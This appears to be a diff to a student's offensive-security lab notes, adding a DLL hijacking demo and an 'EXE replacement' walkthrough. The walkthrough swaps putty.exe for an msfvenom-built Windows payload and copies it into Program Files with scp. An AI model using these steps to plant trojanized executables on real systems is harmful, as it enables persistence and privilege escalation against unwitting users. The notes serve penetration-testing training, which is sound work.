@@ -3304,7 +3304,7 @@ Create Task
 okay
 
 
-## DLL HIGHKJACKING (CMD)
+## DLL HIGHKJACKING (DEMO CMD)
 
 1. Look for services with: (Services)
 No description
@@ -3379,7 +3379,34 @@ SSPICLI.dll                                                                     
 6. Run it and now the service will utilize the .dll that has now been replaced so it will be called
 
 
+## EXE REPLACEMENT (DEMO CMD)
 
+
+1. Rename putty.exe to backupputty.exe
+2. Now we do MSFVENOM to craft a payload that will replace the exe using -f exe and the name to putty.exe
+3. Payload
+```
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\Users\Student\Desktop\whoami.txt' -f exe > putty.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 242 bytes
+Final size of exe file: 73802 bytes
+```
+4. SCP the new putty.exe over to your correct directory
+```
+C:\Users\student>scp student@10.50.37.42:/home/student/putty.exe "C:\Program Files (x86)\Putty"
+student@10.50.37.42's password:
+putty.exe                                                                             100%   72KB  72.1KB/s   00:00
+```
+
+5. Run new exectuable or reboot system
+
+## DLL HIGHJACKING / EXE REPLACEMENT RULES
+
+DLL need Write Privileges
+
+EXE needs to be able to rename the executable
 
 
 
